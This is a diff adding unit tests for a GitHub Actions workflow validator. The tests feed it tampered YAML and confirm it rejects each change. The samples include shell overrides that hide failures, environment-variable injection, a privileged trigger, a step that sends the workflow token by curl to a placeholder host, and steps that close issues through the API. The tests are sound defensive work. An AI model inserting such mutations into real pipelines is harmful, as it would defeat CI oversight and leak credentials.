@@ -12,6 +12,9 @@ sys.path.insert(0, str(ROOT / "13_Faculty_Resources" / "_automation"))
 
 from maintenance.validate_scheduled_workflows import (  # noqa: E402
     EXPECTED_CRONS,
+    EXPECTED_JOB_IDS,
+    EXPECTED_STEP_INVENTORIES,
+    EXPECTED_WORKFLOW_CONTRACT_DIGESTS,
     PINNED_ACTIONS,
     SCOPED_FILES,
     validate_repository,
@@ -79,6 +82,21 @@ class ScheduledWorkflowTests(unittest.TestCase):
 
     def test_repository_workflow_contract_is_valid(self):
         self.assertEqual(validate_repository(ROOT), [])
+
+    def test_exact_structural_contract_covers_every_scoped_workflow(self):
+        self.assertEqual(set(EXPECTED_JOB_IDS), SCOPED_FILES)
+        self.assertEqual(set(EXPECTED_STEP_INVENTORIES), SCOPED_FILES)
+        self.assertEqual(set(EXPECTED_WORKFLOW_CONTRACT_DIGESTS), SCOPED_FILES)
+        for name in SCOPED_FILES:
+            with self.subTest(name=name):
+                self.assertEqual(
+                    set(EXPECTED_STEP_INVENTORIES[name]),
+                    EXPECTED_JOB_IDS[name],
+                )
+                self.assertRegex(
+                    EXPECTED_WORKFLOW_CONTRACT_DIGESTS[name],
+                    r"\A[0-9a-f]{64}\Z",
+                )
 
     def test_exact_schedule_map_is_parsed_with_base_loader(self):
         self.assertEqual(EXPECTED_CRONS, EXPECTED)
@@ -391,6 +409,219 @@ class ScheduledWorkflowTests(unittest.TestCase):
                 + marker
             ),
             "step inventory",
+        )
+
+    def test_validator_rejects_execution_neutralization_overrides(self):
+        cases = (
+            (
+                "maintenance-sp-health-monitor.yml",
+                "permissions:\n  contents: read\n",
+                (
+                    "defaults:\n"
+                    "  run:\n"
+                    "    shell: bash {0} || true\n\n"
+                    "permissions:\n"
+                    "  contents: read\n"
+                ),
+                "workflow defaults",
+            ),
+            (
+                "maintenance-sp-health-monitor.yml",
+                "  monitor:\n    runs-on: ubuntu-latest\n",
+                (
+                    "  monitor:\n"
+                    "    defaults:\n"
+                    "      run:\n"
+                    "        shell: bash {0} || true\n"
+                    "    runs-on: ubuntu-latest\n"
+                ),
+                "job defaults",
+            ),
+            (
+                "maintenance-sp-health-monitor.yml",
+                "  monitor:\n    runs-on: ubuntu-latest\n",
+                (
+                    "  monitor:\n"
+                    "    continue-on-error: true\n"
+                    "    runs-on: ubuntu-latest\n"
+                ),
+                "job continue-on-error",
+            ),
+            (
+                "maintenance-sp-health-monitor.yml",
+                (
+                    "      - name: Check public content-free Interview Room receipt\n"
+                    "        run: >-\n"
+                ),
+                (
+                    "      - name: Check public content-free Interview Room receipt\n"
+                    "        shell: bash {0} || true\n"
+                    "        run: >-\n"
+                ),
+                "step shell",
+            ),
+            (
+                "maintenance-sp-health-monitor.yml",
+                (
+                    "      - name: Check public content-free Interview Room receipt\n"
+                    "        run: >-\n"
+                ),
+                (
+                    "      - name: Check public content-free Interview Room receipt\n"
+                    "        continue-on-error: true\n"
+                    "        run: >-\n"
+                ),
+                "step continue-on-error",
+            ),
+        )
+        for name, old, new, message in cases:
+            with self.subTest(message=message):
+                self.assert_mutation_rejected(name, old, new, message)
+
+    def test_validator_locks_privileged_triggers_and_workflow_environment(self):
+        cases = (
+            (
+                "maintenance-sp-health-monitor.yml",
+                "  workflow_dispatch:\n",
+                "  workflow_dispatch:\n  pull_request_target:\n",
+            ),
+            (
+                "maintenance-sp-health-monitor.yml",
+                "permissions:\n  contents: read\n",
+                (
+                    "env:\n"
+                    "  BASH_ENV: /tmp/neutralize\n"
+                    "  NODE_OPTIONS: --require=/tmp/neutralize.js\n\n"
+                    "permissions:\n"
+                    "  contents: read\n"
+                ),
+            ),
+        )
+        for name, old, new in cases:
+            with self.subTest(mutation=new):
+                self.assert_mutation_rejected(
+                    name,
+                    old,
+                    new,
+                    "workflow contract",
+                )
+
+    def test_sp_monitor_rejects_extra_credential_bearing_step(self):
+        marker = "      - name: Upload Interview Room monitor receipt\n"
+        self.assert_mutation_rejected(
+            "maintenance-sp-health-monitor.yml",
+            marker,
+            (
+                "      - name: Call a credential-bearing endpoint\n"
+                "        env:\n"
+                "          X_KEY: ${{ github.token }}\n"
+                "        run: >-\n"
+                "          curl --header \"X-Key: $X_KEY\"\n"
+                "          https://example.invalid/collect\n\n"
+                + marker
+            ),
+            "step inventory",
+        )
+
+    def test_surveillance_rejects_split_path_extra_job_and_step(self):
+        self.assert_mutation_rejected(
+            "surveillance-link-monitor.yml",
+            "jobs:\n  link-audit:\n",
+            (
+                "jobs:\n"
+                "  bypass:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - env:\n"
+                "          GH_TOKEN: ${{ github.token }}\n"
+                "        run: |\n"
+                "          root=https://api.github.com/repos/example/repo\n"
+                "          path=issues/1\n"
+                "          target=\"$root/$path\"\n"
+                "          gh api --method PATCH \"$target\" -f state=closed\n"
+                "  link-audit:\n"
+            ),
+            "job IDs",
+        )
+
+        marker = "      - name: Publish rolling surveillance inbox\n"
+        self.assert_mutation_rejected(
+            "surveillance-citations.yml",
+            marker,
+            (
+                "      - name: Mutate an issue through a split path\n"
+                "        env:\n"
+                "          GH_TOKEN: ${{ github.token }}\n"
+                "        run: |\n"
+                "          root=https://api.github.com/repos/example/repo\n"
+                "          path=issues/1\n"
+                "          target=\"$root/$path\"\n"
+                "          gh api --method PATCH \"$target\" -f state=closed\n\n"
+                + marker
+            ),
+            "step inventory",
+        )
+
+    def test_validator_locks_every_allowed_step_contract(self):
+        self.assert_mutation_rejected(
+            "maintenance-monthly-review.yml",
+            "        run: python3 -m pip install --requirement requirements.txt\n",
+            (
+                "        env:\n"
+                "          GH_TOKEN: ${{ github.token }}\n"
+                "        run: |\n"
+                "          root=https://api.github.com/repos/example/repo\n"
+                "          path=issues/1\n"
+                "          target=\"$root/$path\"\n"
+                "          gh api --method PATCH \"$target\" -f state=closed\n"
+            ),
+            "job and step contract",
+        )
+
+    def test_checkout_and_artifact_provenance_contracts_are_exact(self):
+        for name in (
+            "maintenance-heartbeat.yml",
+            "maintenance-monthly-review.yml",
+        ):
+            with self.subTest(name=name, contract="checkout history"):
+                self.assert_mutation_rejected(
+                    name,
+                    "          fetch-depth: 0\n          lfs: false\n",
+                    "          lfs: false\n",
+                    "job and step contract",
+                )
+
+        self.assert_mutation_rejected(
+            "maintenance-production-canary.yml",
+            (
+                "          path: |\n"
+                "            tests/smoke/test-results/\n"
+                "            ${{ runner.temp }}/release-twin.json\n"
+            ),
+            "          path: tests/smoke/test-results/\n",
+            "job and step contract",
+        )
+        self.assert_mutation_rejected(
+            "maintenance-sp-health-monitor.yml",
+            "          path: ${{ runner.temp }}/sp-health-monitor.json\n",
+            "          path: ${{ runner.temp }}/unrelated.json\n",
+            "job and step contract",
+        )
+
+    def test_production_canary_rejects_swapped_site_environment(self):
+        self.assert_mutation_rejected(
+            "maintenance-production-canary.yml",
+            (
+                "          MS3_BASE_URL: https://une-ms3-psychiatry.netlify.app\n"
+                "          RES_BASE_URL: "
+                "https://mmc-psychiatry-residents-sanford.netlify.app\n"
+            ),
+            (
+                "          MS3_BASE_URL: "
+                "https://mmc-psychiatry-residents-sanford.netlify.app\n"
+                "          RES_BASE_URL: https://une-ms3-psychiatry.netlify.app\n"
+            ),
+            "job and step contract",
         )
 
     def test_validator_rejects_unsafe_concurrency(self):
